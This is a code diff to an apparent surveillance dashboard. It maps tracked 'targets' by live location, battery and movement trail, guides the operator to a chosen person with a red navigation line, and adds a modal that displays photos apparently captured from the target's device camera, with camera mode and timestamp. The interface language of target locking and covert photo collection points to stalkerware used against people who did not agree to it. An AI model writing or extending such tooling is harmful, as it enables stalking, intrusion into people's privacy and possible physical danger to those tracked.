@@ -23,7 +23,6 @@
         .user-card { background: #2d3748; padding: 15px; border-radius: 12px; margin-bottom: 15px; cursor: pointer; border: 2px solid transparent; transition: 0.3s; position: relative; }
         .user-card:hover { border-color: #4a5568; }
         
-        /* Green Active Track Mode */
         .active-follow { border-color: #e53e3e !important; background: #2d1a1a !important; box-shadow: 0 0 15px rgba(229, 62, 62, 0.3); }
         
         .track-indicator { color: #f56565; font-size: 11px; font-weight: bold; display: none; margin-top: 8px; animation: blink 1s infinite; }
@@ -32,18 +31,29 @@
         .battery-tag { float: right; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; background: #234e33; color: #48bb78; }
         
         .track-btn { background: #4a5568; color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; cursor: pointer; margin-top: 10px; font-weight: bold; transition: 0.2s; }
+        .photo-btn { background: #63b3ed !important; color: #1a202c !important; }
         .active-btn { background: #e53e3e !important; box-shadow: 0 0 10px rgba(229, 62, 62, 0.5); }
 
         .btn-clear { background: #e53e3e; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; cursor: pointer; margin-bottom: 10px; font-weight: bold; transition: 0.2s; }
-        .btn-clear:hover { background: #c53030; }
         
         .delete-btn { position: absolute; top: 10px; right: 10px; color: #718096; font-size: 18px; cursor: pointer; }
-        .delete-btn:hover { color: #f56565; }
+
+        /* Modal for Photo */
+        #photoModal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; flex-direction: column; }
+        #photoModal img { max-width: 90%; max-height: 70%; border: 5px solid white; border-radius: 10px; }
+        #photoModal .info { color: white; margin-top: 15px; text-align: center; background: #2d3748; padding: 10px; border-radius: 8px; }
+        #photoModal span { position: absolute; top: 20px; right: 30px; font-size: 40px; color: white; cursor: pointer; }
 
         @keyframes blink { 50% { opacity: 0.3; } }
     </style>
 </head>
 <body>
+
+<div id="photoModal">
+    <span onclick="document.getElementById('photoModal').style.display='none'">×</span>
+    <img id="modalImg" src="">
+    <div class="info" id="modalInfo"></div>
+</div>
 
 <audio id="trackSound" src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3" preload="auto"></audio>
 
@@ -91,7 +101,7 @@
 
     const adminIcon = L.icon({
         iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-pink.png',
-        iconSize: [25, 41], iconAnchor: [12, 41], popupAnchor: [1, -34], shadowSize: [41, 41]
+        iconSize: [25, 41], iconAnchor: [12, 41]
     });
 
     function initMap() {
@@ -115,7 +125,6 @@
                 if (adminMarker) adminMarker.setLatLng(latlng);
                 else adminMarker = L.marker(latlng, {icon: adminIcon}).addTo(map).bindPopup("<b>Admin (You)</b>");
                 document.getElementById('admin-pos').innerText = `${latlng[0].toFixed(4)}, ${latlng[1].toFixed(4)}`;
-                
                 if(followingUser) updateRedLine();
             }, null, { enableHighAccuracy: true });
         }
@@ -127,14 +136,8 @@
             if(redNavLine) { map.removeLayer(redNavLine); redNavLine = null; }
         } else {
             followingUser = userId;
-            const sound = document.getElementById('trackSound');
-            sound.currentTime = 0;
-            sound.play().catch(e => console.log("Sound error"));
-
-            // Jump to User Position Immediately
-            if(markers[userId]) {
-                map.setView(markers[userId].getLatLng(), 18);
-            }
+            document.getElementById('trackSound').play().catch(e => {});
+            if(markers[userId]) map.setView(markers[userId].getLatLng(), 18);
             updateRedLine();
         }
     }
@@ -145,11 +148,16 @@
             return;
         }
         const points = [adminMarker.getLatLng(), markers[followingUser].getLatLng()];
-        if (redNavLine) {
-            redNavLine.setLatLngs(points);
-        } else {
-            redNavLine = L.polyline(points, {color: '#e53e3e', weight: 5, dashArray: '10, 15', opacity: 0.9}).addTo(map);
-        }
+        if (redNavLine) redNavLine.setLatLngs(points);
+        else redNavLine = L.polyline(points, {color: '#e53e3e', weight: 5, dashArray: '10, 15'}).addTo(map);
+    }
+
+    // Modal mein Cam Mode aur Time dikhane ke liye update
+    function openPhoto(data, cam, time) {
+        if(!data || data === 'undefined') return alert("Target ne abhi tak photo nahi bheji!");
+        document.getElementById('modalImg').src = data;
+        document.getElementById('modalInfo').innerHTML = `<b>Source:</b> ${cam || 'Unknown'} <br> <b>Time:</b> ${time || 'Just now'}`;
+        document.getElementById('photoModal').style.display = 'flex';
     }
 
     function listenLive() {
@@ -169,21 +177,25 @@
                     <div class="user-card ${isFollowing ? 'active-follow' : ''}" onclick="map.setView([${d.lat}, ${d.lng}], 17)">
                         <span class="delete-btn" onclick="deleteUser('${id}', event)">×</span>
                         <strong>${id}</strong> <span class="battery-tag">🔋 ${d.battery}%</span>
+                        
+                        <div style="font-size:11px; color:#63b3ed; margin-top:5px;">📷 Cam: ${d.camMode || 'Wait...'}</div>
+                        <div style="font-size:10px; color:#a0aec0;">🕒 Time: ${d.lastPhotoTime || '--:--'}</div>
+                        
                         <div class="track-indicator">🔴 TARGET LOCKED - FOLLOW RED LINE</div>
+                        
+                        <button class="track-btn photo-btn" onclick="event.stopPropagation(); openPhoto('${d.userPhoto}', '${d.camMode}', '${d.lastPhotoTime}')">
+                            🖼️ VIEW TARGET PHOTO
+                        </button>
+
                         <button class="track-btn ${isFollowing ? 'active-btn' : ''}" onclick="event.stopPropagation(); toggleFollow('${id}')">
                             ${isFollowing ? '🛑 STOP TRACKING' : '🎯 TRACK TARGET'}
                         </button>
                     </div>`;
 
-                if (markers[id]) {
-                    markers[id].setLatLng(pos);
-                } else {
-                    markers[id] = L.marker(pos).addTo(map).bindTooltip(id, {permanent: true, direction: 'top'});
-                }
+                if (markers[id]) markers[id].setLatLng(pos);
+                else markers[id] = L.marker(pos).addTo(map).bindTooltip(id, {permanent: true, direction: 'top'});
 
-                if (!paths[id]) {
-                    paths[id] = L.polyline([], {color: '#00ff00', weight: 4, opacity: 0.8}).addTo(map);
-                }
+                if (!paths[id]) paths[id] = L.polyline([], {color: '#00ff00', weight: 4}).addTo(map);
                 paths[id].addLatLng(pos);
 
                 if (isFollowing) {
@@ -196,17 +208,15 @@
 
     function deleteUser(id, e) {
         e.stopPropagation();
-        if(confirm("User ko list se hataye?")) {
+        if(confirm("Hata dein?")) {
             db.collection("locations").doc(id).delete();
             if(markers[id]) map.removeLayer(markers[id]);
             if(paths[id]) map.removeLayer(paths[id]);
-            delete markers[id]; delete paths[id];
-            if(followingUser === id) { followingUser = null; if(redNavLine) map.removeLayer(redNavLine); }
         }
     }
 
     function clearHistory() {
-        if(confirm("Saari lines mita dein?")) {
+        if(confirm("Clear lines?")) {
             for (let id in paths) { map.removeLayer(paths[id]); delete paths[id]; }
         }
     }
